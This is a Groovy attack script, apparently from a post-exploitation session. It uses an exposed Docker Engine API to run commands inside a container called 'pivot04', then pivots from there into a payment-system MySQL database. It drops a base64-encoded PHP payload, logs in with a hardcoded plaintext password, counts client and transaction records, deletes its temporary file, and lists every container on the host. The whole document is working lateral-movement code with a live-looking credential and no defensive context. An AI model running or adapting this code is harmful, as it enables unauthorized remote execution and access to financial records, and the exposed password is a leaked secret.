// Final verification from pivot04: MySQL auth to T1Pagos
dockerApi = "http://172.27.140.148:4243"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(60000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String containerId, String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def php = '''<?php
$pdo = new PDO("mysql:host=172.27.141.6;port=3310;dbname=payment_t1", "app_t1", "wUt22Us2CUh#+M=", array(PDO::ATTR_TIMEOUT => 6));
echo "PIVOT04_AUTH_OK\\n";
foreach ($pdo->query("SELECT CURRENT_USER() cu, @@hostname hn, (SELECT COUNT(*) FROM client) nc, (SELECT COUNT(*) FROM `transaction`) nt") as $r) {
    echo "USER=".$r['cu']." | HOST=".$r['hn']." | clients=".$r['nc']." | transactions=".$r['nt']."\\n";
}
'''

def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/v.php && php /tmp/v.php; rm -f /tmp/v.php"

println "=== PIVOT04 -> T1Pagos MySQL ==="
println execIn("pivot04", cmd)

// Final container list snapshot
def httpGet(String urlStr) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("GET")
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(30000)
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}
println ""
println "=== FINAL CONTAINER LIST ==="
def r = httpGet(dockerApi + "/containers/json?all=true")
if (r.code == 200) {
    def arr = new groovy.json.JsonSlurper().parseText(r.body)
    arr.each { c ->
        println c.Id.substring(0,12) + " | " + c.Names.join(",") + " | " + c.State + " | " + c.HostConfig?.NetworkMode + " | " + c.Image
    }
}
